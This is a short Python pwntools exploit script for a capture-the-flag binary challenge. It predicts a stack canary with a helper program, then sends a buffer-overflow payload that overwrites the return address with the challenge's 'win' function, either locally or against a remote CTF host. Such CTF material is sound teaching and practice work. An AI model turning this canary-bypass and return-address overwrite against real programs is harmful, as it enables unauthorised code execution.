#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep
import subprocess

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("amt.rs", 31175)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *0x4013a3
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

q = process("./hyper_guesser")
q.recvuntil(b"guess: ")
canary = eval(q.recvline().rstrip())
q.sendline()
log.info("canary: " + hex(canary))
q.close()

payload = b'A' * 40
payload += p32(0xdeadbeef)
payload += p32(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p64(elf.symbols["win"])

p.sendlineafter("3) Exit", '2')
p.sendlineafter(':', payload)

p.interactive()
